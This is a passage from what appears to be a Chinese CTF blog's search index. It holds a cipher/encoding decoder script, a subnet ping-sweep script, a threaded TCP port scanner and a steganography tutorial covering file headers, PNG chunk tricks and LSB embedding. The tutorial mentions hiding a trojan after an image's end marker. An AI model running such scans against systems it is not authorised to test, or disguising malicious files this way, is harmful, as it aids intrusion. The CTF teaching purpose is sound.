&#x27;8&#x27;: &#x27;---..&#x27;, &#x27;9&#x27;: &#x27;----.&#x27;,</span><br><span class="line">                               &#x27;0&#x27;: &#x27;-----&#x27;, &#x27;, &#x27;: &#x27;--..--&#x27;, &#x27;.&#x27;: &#x27;.-.-.-&#x27;,&#x27;?&#x27;: &#x27;..--..&#x27;, &#x27;/&#x27;: &#x27;-..-.&#x27;, &#x27;-&#x27;: &#x27;-....-&#x27;,&#x27;(&#x27;: &#x27;-.--.&#x27;, &#x27;)&#x27;: &#x27;-.--.-&#x27;&#125;</span><br><span class="line">            # 在末尾添加额外空间以访问最后一个摩斯密码</span><br><span class="line">            content += &#x27; &#x27;</span><br><span class="line">            decipher = &#x27;&#x27;</span><br><span class="line">            citext = &#x27;&#x27;</span><br><span class="line">            for letter in content:</span><br><span class="line">                # 检查空间</span><br><span class="line">                if (letter != &#x27; &#x27;):</span><br><span class="line">                    # 计数器来跟踪空间</span><br><span class="line">                    i = 0</span><br><span class="line">                    # 在空格的情况下</span><br><span class="line">                    citext += letter</span><br><span class="line">                # 在空间的情况下</span><br><span class="line">                else:</span><br><span class="line">                    # 如果 i = 1 表示一个新字符</span><br><span class="line">                    i += 1</span><br><span class="line">                    # 如果 i = 2 表示一个新词</span><br><span class="line">                    if i == 2:</span><br><span class="line">                        # 添加空格来分隔单词</span><br><span class="line">                        decipher += &#x27; &#x27;</span><br><span class="line">                    else:</span><br><span class="line">                        # 使用它们的值访问密钥（加密的反向）</span><br><span class="line">                        decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT.values()).index(citext)]</span><br><span class="line">                        citext = &#x27;&#x27;</span><br><span class="line">            print(decipher)</span><br><span class="line">            return decipher</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;莫斯密码-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    content = input(&#x27;需要界面的字符串&#x27;)</span><br><span class="line">    key = input(&#x27;需要界面的字符串对应key，没有则直接回车&#x27;)</span><br><span class="line">    cr = Cryptoall()</span><br><span class="line"></span><br><span class="line">    cr.rot47decoder(content)  # rot47</span><br><span class="line">    cr.rot18decoder(content) # rot18</span><br><span class="line">    cr.rot13decoder(content)  # rot13</span><br><span class="line">    cr.rot5decoder(content)    #rot5</span><br><span class="line"></span><br><span class="line">    cr.des3_encode(content, key)  # des3</span><br><span class="line">    cr.aes_encode(content, key)  # aes</span><br><span class="line">    cr.des_descrypt(content, key)  # des</span><br><span class="line">    cr.VigenereDecrypto(content, key)  # 维吉尼亚密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cr.mosdecrypt(content)#莫斯密码</span><br><span class="line">    cr.railfence(content)  # 栅栏密码</span><br><span class="line">    cr.caesar_Crypto(content)  # 凯撒密码</span><br><span class="line"></span><br><span class="line">    cr.img_to_base64()  # 图片转base64</span><br><span class="line">    cr.base_to_img(content)  # base64转成图片</span><br><span class="line">    cr.b16decode(content)  # base16</span><br><span class="line">    cr.b32decode(content)  # base32</span><br><span class="line">    cr.b36decode(content)  # base36</span><br><span class="line">    cr.b58decode(content)  # base58</span><br><span class="line">    cr.b64decode(content)  # base64</span><br><span class="line">    cr.b85decode(content)  # base85,RFC1924型（没什么卵用，就是花里胡哨）</span><br><span class="line">    cr.a85decode(content)  # base85,ASCII85型（ctf常用）</span><br><span class="line">    cr.b91decode(content)  # base91</span><br><span class="line">    cr.b92decode(content)  # base92</span><br><span class="line">    cr.b128decode2(content)  # base128_2</span><br><span class="line">    cr.b128decode1(content)  # base128_1</span><br><span class="line"></span><br><span class="line">    cr.htmlencode(content)  # html解码</span><br><span class="line">    cr.urldecode(content)  # URL解码</span><br><span class="line">    cr.Unicode(content)  # utf-8转码</span><br><span class="line">    cr.str_to_str(content)  # \xe4\xb8\xad\xe6\x96\x87转中文</span><br><span class="line">    cr.chr_to_two(content)  # 字符转成二进制</span><br><span class="line">    cr.two_to_chr(content)  # 二进制转成字符</span><br><span class="line">    cr.chr_to_six(content)  # 二进制转十六进制</span><br><span class="line">    cr.six_to_chr(content)  # 十六进制转二进制</span><br></pre></td></tr></table></figure><h2 id="扫描ip"><a href="#扫描ip" class="headerlink" title="扫描ip"></a>扫描ip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import multiprocessing</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def check_alive(ip):</span><br><span class="line"></span><br><span class="line">    result = subprocess.call(&#x27;ping -w 1000 -n 1 %s&#x27; % ip, stdout=subprocess.PIPE, shell=True)</span><br><span class="line">    if result == 0:</span><br><span class="line">        h = subprocess.getoutput(&#x27;ping &#x27; + ip)</span><br><span class="line">        returnnum = h.split(&#x27;平均 = &#x27;)[1]</span><br><span class="line">        with open(&#x27;alive_ip.txt&#x27;,&quot;a&quot;) as f:</span><br><span class="line">            f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">        print(&#x27;\033[32m%s\033[0m 能ping通，延迟平均值为：%s&#x27; % (ip, returnnum))</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;\033[31m%s\033[0m ping 不通！&#x27; % ip)</span><br><span class="line">def main():</span><br><span class="line">    c_ip = &#x27;192.168.3.&#x27;</span><br><span class="line">    for i in range(1,255):</span><br><span class="line">        ip=c_ip+str(i)</span><br><span class="line">        p = multiprocessing.Process(target=check_alive, args=(ip,))</span><br><span class="line">        p.start()</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    file = open(&quot;alive_ip.txt&quot;, &#x27;w&#x27;).close()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">from datetime import datetime</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line">port_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ScanPort:</span><br><span class="line">    def __init__(self, ip):</span><br><span class="line">        self._ip = ip</span><br><span class="line">        self.ip = None</span><br><span class="line"></span><br><span class="line">    def scan_port(self, port):</span><br><span class="line">        try:</span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            res = s.connect_ex((self.ip, port))</span><br><span class="line">            if res == 0:</span><br><span class="line">                print(&#x27;Ip:&#123;&#125; Port:&#123;&#125; IS OPEN&#x27;.format(self.ip, port))</span><br><span class="line">                port_list.append(port)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">        finally:</span><br><span class="line">            s.close()</span><br><span class="line"></span><br><span class="line">    def start(self):</span><br><span class="line">        remote_server = self._ip</span><br><span class="line">        self.ip = socket.gethostbyname(remote_server)</span><br><span class="line">        ports = [i for i in range(1, 6000)]#65535</span><br><span class="line">        socket.setdefaulttimeout(0.5)</span><br><span class="line">        t1 = datetime.now()</span><br><span class="line">        pool = ThreadPool(processes=1000)</span><br><span class="line">        pool.map(self.scan_port, ports)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line">        print(&#x27;[ * ] 端口扫描已完成，耗时：&#x27;, datetime.now() - t1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ip = input(&quot;[ * ] 请输入需要扫描的IP地址：&quot;)</span><br><span class="line">    print(&#x27;[ * ] 正在进行端口扫描&#x27;)</span><br><span class="line">    ScanPort(ip).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc类之隐写术</title>
      <link href="/article/2021-12-14-misc%E7%B1%BB%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>/article/2021-12-14-misc%E7%B1%BB%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>对常见文件文件头和隐写术做个归纳总结。</p></blockquote><span id="more"></span><h1 id="一、文件头文件尾"><a href="#一、文件头文件尾" class="headerlink" title="一、文件头文件尾"></a>一、文件头文件尾</h1><h2 id="1、图片"><a href="#1、图片" class="headerlink" title="1、图片"></a>1、图片</h2><ul><li>JPEG</li></ul><p>文件头：FF D8 FF<br>文件尾：FF D9</p><ul><li>TGA</li></ul><p>未压缩的前4字节 00 00 02 00</p><p>RLE压缩的前5字节 00 00 10 00 00</p><ul><li>PNG</li></ul><p>文件头：89 50 4E 47 0D 0A 1A 0A　　　<br>文件尾：AE 42 60 82</p><ul><li>GIF</li></ul><p>文件头：47 49 46 38 39(37) 61　　<br>文件尾：00 3B</p><ul><li>BMP</li></ul><p>文件头：42 4D</p><p>文件头标识(2 bytes) 42(B) 4D(M)</p><ul><li>TIFF (tif)</li></ul><p>文件头：49 49 2A 00</p><ul><li>ico</li></ul><p>文件头：00 00 01 00</p><ul><li>Adobe Photoshop (psd)</li></ul><p>文件头：38 42 50 53</p><h2 id="2、office文件"><a href="#2、office文件" class="headerlink" title="2、office文件"></a>2、office文件</h2><ul><li>MS Word/Excel (xls.or.doc)</li></ul><p>文件头：D0 CF 11 E0</p><ul><li>MS ppt </li></ul><p>文件头：50 4B 03 04</p><ul><li>MS Access (mdb)</li></ul><p>文件头：53 74 61 6E 64 61 72 64 20 4A</p><ul><li>WordPerfect (wpd)</li></ul><p>文件头：FF 57 50 43</p><ul><li>Adobe Acrobat (pdf)</li></ul><p>文件头：25 50 44 46 2D 31 2E</p><ul><li>application/vnd.visio(vsd)</li></ul><p>文件头：D0 CF 11 E0 A1 B1 1A E1</p><ul><li>Email [thorough only] (eml)</li></ul><p>文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</p><ul><li>Outlook Express (dbx)</li></ul><p>文件头：CF AD 12 FE C5 FD 74 6F</p><ul><li>Outlook (pst)</li></ul><p>文件头：21 42 44 4E</p><ul><li>Rich Text Format (rtf)</li></ul><p>文件头：7B 5C 72 74 66</p><ul><li>txt 文件(txt)</li></ul><p>文件头：Unicode：FE FF </p><p>Unicode big endian：FF FE </p><p>UTF-8：EF BB BF </p><p>ANSI编码是没有文件头的</p><h2 id="3、压缩包文件"><a href="#3、压缩包文件" class="headerlink" title="3、压缩包文件"></a>3、压缩包文件</h2><ul><li>ZIP Archive (zip)</li></ul><p>文件头：50 4B 03 04</p><p>文件尾：50 4B</p><ul><li>RAR Archive (rar)</li></ul><p>文件头：52 61 72 21 1A 07 00</p><p>文件尾：C4 3D 7B 00 40 07 00</p><ul><li>LZIP Archive (lzip)</li></ul><p>文件头：4C 5A 49 50 </p><h2 id="4、音频文件"><a href="#4、音频文件" class="headerlink" title="4、音频文件"></a>4、音频文件</h2><ul><li>Wave (wav)</li></ul><p>文件头：57 41 56 45</p><p>52 49 46 46 xx xx xx xx 57 41 56 45 66 6D 74 20</p><ul><li>audio(Audio)</li></ul><p>文件头： 4D 54 68 64</p><ul><li>audio/x-aac（aac）</li></ul><p>文件头：FF F1(9)</p><ul><li>网易云（ape）</li></ul><p>文件头：4D 41 43 20</p><h2 id="5、视频文件"><a href="#5、视频文件" class="headerlink" title="5、视频文件"></a>5、视频文件</h2><ul><li>AVI (avi)</li></ul><p>文件头：41 56 49 20</p><ul><li>Real Audio (ram)</li></ul><p>文件头：2E 72 61 FD</p><ul><li>Real Media (rm)</li></ul><p>文件头：2E 52 4D 46</p><ul><li>MPEG (mpg)</li></ul><p>文件头：00 00 01 BA(3)</p><ul><li>Quicktime (mov)</li></ul><p>文件头：6D 6F 6F 76</p><ul><li>Windows Media (asf)</li></ul><p>文件头：30 26 B2 75 8E 66 CF 11</p><ul><li>MIDI (mid)</li></ul><p>文件头：4D 54 68 64</p><h2 id="6、代码文件"><a href="#6、代码文件" class="headerlink" title="6、代码文件"></a>6、代码文件</h2><ul><li>XML (xml)</li></ul><p>文件头：3C 3F 78 6D 6C</p><ul><li>HTML (html)</li></ul><p>文件头：68 74 6D 6C 3E</p><ul><li>Quicken (qdf)</li></ul><p>文件头：AC 9E BD 8F</p><ul><li>Windows Password (pwl)</li></ul><p>文件头：E3 82 85 96</p><h2 id="7、其他类型"><a href="#7、其他类型" class="headerlink" title="7、其他类型"></a>7、其他类型</h2><ul><li>windows证书文件(der)</li></ul><p>文件头：30 82 03 C9</p><ul><li>CAD (dwg)</li></ul><p>文件头：41 43 31 30</p><ul><li>Windows Shortcut (lnk)</li></ul><p>文件头：4C 00 00 00</p><ul><li>Windows reg(reg)</li></ul><p>文件头：52 45 47 45 44 49 54 34</p><ul><li>java类class</li></ul><p>文件头：CA FE BA BE</p><ul><li>PCAP</li></ul><p>文件头：0A 0D 0D 0A</p><h1 id="二、图片隐写"><a href="#二、图片隐写" class="headerlink" title="二、图片隐写"></a>二、图片隐写</h1><h2 id="1、附加式的图片隐写"><a href="#1、附加式的图片隐写" class="headerlink" title="1、附加式的图片隐写"></a>1、附加式的图片隐写</h2><p>操作系统识别，从文件头标志，到文件的结束标志位<br>当系统识别到图片的结束标志位后，默认是不再继续识别的<br>所以可以在文件尾后面加东西</p><h3 id="（1）附加字符串"><a href="#（1）附加字符串" class="headerlink" title="（1）附加字符串"></a>（1）附加字符串</h3><p>最简单的是附加字符串</p><p>附加方法</p><ul><li><p>winhex直接附加再保存</p></li><li><p>copy /b a.jpg+b.txt c.jpg，在a图片里加b的内容，得到c图片</p></li></ul><p>识别方法</p><ul><li><p>winhex直接看</p></li><li><p>notepad也可以看</p></li><li><p>linux的strings指令</p></li><li><p>liunx的exiftool（查看隐藏信息）</p></li></ul><p>应用</p><ul><li>制作图片马，即把木马放到图片的最后</li></ul><h3 id="（2）隐藏压缩文件"><a href="#（2）隐藏压缩文件" class="headerlink" title="（2）隐藏压缩文件"></a>（2）隐藏压缩文件</h3><p>可以把压缩文件藏在图片文件尾后<br>看起来还是图片</p><p>附加方法</p><ul><li>winhex直接附加再保存</li></ul><p>识别方法</p><ul><li>有些直接改扩展名就可以用</li><li>linux的binwalk指令参数-e</li><li>stegsolve分离</li><li>winhex复制压缩文件内容重新保存</li><li>liunx的foremost指令</li><li>liunx的outguess指令(outguess -k ‘密码’ -r 图片 保存的位置 )</li><li>liunx的steghide指令(steghide extract -sf 图片名称 -p 密码)</li></ul><h2 id="2、基于文件结构的图片隐写"><a href="#2、基于文件结构的图片隐写" class="headerlink" title="2、基于文件结构的图片隐写"></a>2、基于文件结构的图片隐写</h2><p>主要是针对PNG图片</p><p>标准的PNG文件结构应包括：</p><ul><li><p>PNG文件标志</p></li><li><p>PNG数据块：关键数据块和辅助数据块，其中正常的关键数据块有长度、数据块类型码、数据块数据和CRC这4种</p></li></ul><h3 id="（1）png图片文件头数据块（IHDR）"><a href="#（1）png图片文件头数据块（IHDR）" class="headerlink" title="（1）png图片文件头数据块（IHDR）"></a>（1）png图片文件头数据块（IHDR）</h3><p>PNG图片的第一个数据块</p><p>一张PNG图片仅有一个IHDR数据块</p><p>包括了图片的宽，高，图像深度，颜色类型，压缩方法等信息<br><img src="/image/media/2022/misc/1.png"></p><p>蓝色部分就是IHDR</p><p>可以修改高度值或宽度值对部分信息进行隐藏</p><ul><li><p>如果图片原本是800(宽)*600(高)，然后图片的高度从600变成500</p></li><li><p>这样下面800×100区域的信息就无法从图片中显示出来，我们可见的只有上方800*500的区域，这样就达成了图片隐写的目的</p></li><li><p>同理可知图片的宽度也可以进行类似的修改以达到隐藏信息的目的</p></li></ul><p>识别方法</p><ul><li><p>用winhex或者010Editor等编辑器打开图片</p></li><li><p>修改长度或宽度值</p></li><li><p>在修改文件后，需要利用CRC Calculator对CRC校验码进行重新计算赋值，以防图片被修改后，自身的CRC校验报错，导致图片不能正常打开</p></li></ul><h3 id="（2）IDAT-数据块"><a href="#（2）IDAT-数据块" class="headerlink" title="（2）IDAT 数据块"></a>（2）IDAT 数据块</h3><ul><li>存储实际的数据</li><li>在数据流中可包含多个连续顺序的图像数据块</li><li>写入一个多余的IDAT也不会多大影响肉眼对图片的观察</li></ul><p>识别方法</p><ul><li>用pngcheck对图片进行检测<code>pngcheck -v hidden.png</code></li></ul><p><img src="/image/media/2022/misc/2.png"></p><p>可能会出现一个size为0的异常块</p><p>提取内容的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line"></span><br><span class="line">from struct import unpack</span><br><span class="line">from binascii import hexlify, unhexlify</span><br><span class="line">import sys, zlib</span><br><span class="line"></span><br><span class="line"># Returns [Position, Chunk Size, Chunk Type, Chunk Data, Chunk CRC]</span><br><span class="line">def getChunk(buf, pos):</span><br><span class="line">    a = []</span><br><span class="line">    a.append(pos)</span><br><span class="line">    size = unpack(&#x27;!I&#x27;, buf[pos:pos+4])[0]</span><br><span class="line">    # Chunk Size</span><br><span class="line">    a.append(buf[pos:pos+4])</span><br><span class="line">    # Chunk Type</span><br><span class="line">    a.append(buf[pos+4:pos+8])</span><br><span class="line">    # Chunk Data</span><br><span class="line">    a.append(buf[pos+8:pos+8+size])</span><br><span class="line">    # Chunk CRC</span><br><span class="line">    a.append(buf[pos+8+size:pos+12+size])</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">def printChunk(buf, pos):</span><br><span class="line">    print &#x27;Pos : &#x27;+str(pos)+&#x27;&#x27;</span><br><span class="line">    print &#x27;Type: &#x27; + str(buf[pos+4:pos+8])</span><br><span class="line">    size = unpack(&#x27;!I&#x27;, buf[pos:pos+4])[0]</span><br><span class="line">    print &#x27;Size: &#x27; + str(size)</span><br><span class="line">    #print &#x27;Cont: &#x27; + str(hexlify(buf[pos+8:pos+8+size]))</span><br><span class="line">    print &#x27;CRC : &#x27; + str(hexlify(buf[pos+size+8:pos+size+12]).upper())</span><br><span class="line">    print</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &#x27;Usage: ./this Stegano_PNG&#x27;</span><br><span class="line">    sys.exit(2)</span><br><span class="line"></span><br><span class="line">buf = open(sys.argv[1]).read()</span><br><span class="line">pos=0</span><br><span class="line"></span><br><span class="line">print &quot;PNG Signature: &quot; + str(unpack(&#x27;cccccccc&#x27;, buf[pos:pos+8]))</span><br><span class="line">pos+=8</span><br><span class="line"></span><br><span class="line">chunks = []</span><br><span class="line">for i in range(3):</span><br><span class="line">    chunks.append(getChunk(buf, pos))</span><br><span class="line">    printChunk(buf, pos)</span><br><span class="line">    pos+=unpack(&#x27;!I&#x27;,chunks[i][1])[0]+12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decompressed = zlib.decompress(chunks[1][3])</span><br><span class="line"># Decompressed data length = height x (width * 3 + 1)</span><br><span class="line">print &quot;Data length in PNG file : &quot;, len(chunks[1][3])</span><br><span class="line">print &quot;Decompressed data length: &quot;, len(decompressed)</span><br><span class="line"></span><br><span class="line">height = unpack(&#x27;!I&#x27;,(chunks[0][3][4:8]))[0]</span><br><span class="line">width = unpack(&#x27;!I&#x27;,(chunks[0][3][:4]))[0]</span><br><span class="line">blocksize = width * 3 + 1</span><br><span class="line">filterbits = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(decompressed),blocksize):</span><br><span class="line">    bit = unpack(&#x27;2401c&#x27;, decompressed[i:i+blocksize])[0]</span><br><span class="line">    if bit == &#x27;\x00&#x27;: filterbits+=&#x27;0&#x27;</span><br><span class="line">    elif bit == &#x27;\x01&#x27;: filterbits+=&#x27;1&#x27;</span><br><span class="line">    else:</span><br><span class="line">        print &#x27;Bit is not 0 or 1... Default is 0 - MAGIC!&#x27;</span><br><span class="line">        sys.exit(3)</span><br><span class="line"></span><br><span class="line">s = filterbits</span><br><span class="line">endianess_filterbits = [filterbits[i:i+8][::-1] for i in xrange(0, len(filterbits), 8)]</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for x in endianess_filterbits:</span><br><span class="line">    if x==&#x27;00000000&#x27;: break</span><br><span class="line">    flag += unhexlify(&#x27;%x&#x27; % int(&#x27;0b&#x27;+str(x), 2))</span><br><span class="line"></span><br><span class="line">print &#x27;Flag: &#x27; + flag</span><br></pre></td></tr></table></figure><h2 id="3、LSB隐写"><a href="#3、LSB隐写" class="headerlink" title="3、LSB隐写"></a>3、LSB隐写</h2><p>LSB，最低有效位，英文是Least Significant Bit</p><ul><li><p>容量大、嵌入速度快、对载体图像质量影响小</p></li><li><p>在PNG和BMP上可以实现</p></li></ul><p>原理</p><ul><li><p>图片中的像素一般是由三种颜色组成，即三原色(红绿蓝)，由这三种原色可以组成其他各种颜色</p></li><li><p>在png图片的存储中,每个颜色占有8bit,即有256种颜色，一共包含256的三次方颜色，即16777216种颜色</p></li><li><p>人类的眼睛可以区分约1,000万种不同的颜色，剩下无法区分的颜色就有6777216</p></li><li><p>LSB隐写就是修改了像素中的最低位，把一些信息隐藏起来</p></li></ul><p>给个直观例子</p><p><img src="/image/media/2022/misc/3.png"></p><p>这人眼看不出颜色区别，但最低位不一样</p><p>嵌入脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import math</span><br><span class="line"> </span><br><span class="line">class LSB:</span><br><span class="line">def __init__(self):</span><br><span class="line">self.im=None</span><br><span class="line"> </span><br><span class="line">def load_bmp(self,bmp_file):</span><br><span class="line">self.im=Image.open(bmp_file)</span><br><span class="line">self.w,self.h=self.im.size</span><br><span class="line">self.available_info_len=self.w*self.h # 不是绝对可靠的</span><br><span class="line">print (&quot;Load&gt;&gt; 可嵌入&quot;,self.available_info_len,&quot;bits的信息&quot;)</span><br><span class="line"> </span><br><span class="line">def write(self,info):</span><br><span class="line">&quot;&quot;&quot;先嵌入信息的长度，然后嵌入信息&quot;&quot;&quot;</span><br><span class="line">info=self._set_info_len(info)</span><br><span class="line">info_len=len(info)</span><br><span class="line">info_index=0</span><br><span class="line">im_index=0</span><br><span class="line">while True:</span><br><span class="line">if info_index&gt;=info_len:</span><br><span class="line">break</span><br><span class="line">data=info[info_index]</span><br><span class="line">x,y=self._get_xy(im_index)</span><br><span class="line">self._write(x,y,data)</span><br><span class="line">info_index+=1</span><br><span class="line">im_index+=1</span><br><span class="line"> </span><br><span class="line">def save(self,filename):</span><br><span class="line">self.im.save(filename)</span><br><span class="line"> </span><br><span class="line">def read(self):</span><br><span class="line">&quot;&quot;&quot;先读出信息的长度，然后读出信息&quot;&quot;&quot;</span><br><span class="line">_len,im_index=self._get_info_len()</span><br><span class="line">info=[]</span><br><span class="line">for i in range(im_index,im_index+_len):</span><br><span class="line">x,y=self._get_xy(i)</span><br><span class="line">data=self._read(x,y)</span><br><span class="line">info.append(data)</span><br><span class="line">return info</span><br><span class="line">#===============================================================#</span><br><span class="line">def _get_xy(self,l):</span><br><span class="line">return l%self.w,int(l/self.w)</span><br><span class="line"> </span><br><span class="line">def _set_info_len(self,info):</span><br><span class="line">l=int(math.log(self.available_info_len,2))+1</span><br><span class="line">info_len=[0]*l</span><br><span class="line">_len=len(info)</span><br><span class="line">info_len[-len(bin(_len))+2:]=[int(i) for i in bin(_len)[2:]]</span><br><span class="line">return info_len+info</span><br><span class="line"> </span><br><span class="line">def _get_info_len(self):</span><br><span class="line">l=int(math.log(self.w*self.h,2))+1</span><br><span class="line">len_list=[]</span><br><span class="line">for i in range(l):</span><br><span class="line">x,y=self._get_xy(i)</span><br><span class="line">_d=self._read(x,y)</span><br><span class="line">len_list.append(str(_d))</span><br><span class="line">_len=&#x27;&#x27;.join(len_list)</span><br><span class="line">_len=int(_len,2)</span><br><span class="line">return _len,l</span><br><span class="line"> </span><br><span class="line">def _write(self,x,y,data):</span><br><span class="line">origin=self.im.getpixel((x,y))</span><br><span class="line">lower_bit=origin%2</span><br><span class="line">if lower_bit==data:</span><br><span class="line">pass</span><br><span class="line">elif (lower_bit,data) == (0,1):</span><br><span class="line">self.im.putpixel((x,y),origin+1)</span><br><span class="line">elif (lower_bit,data) == (1,0):</span><br><span class="line">self.im.putpixel((x,y),origin-1)</span><br><span class="line"> </span><br><span class="line">def _read(self,x,y):</span><br><span 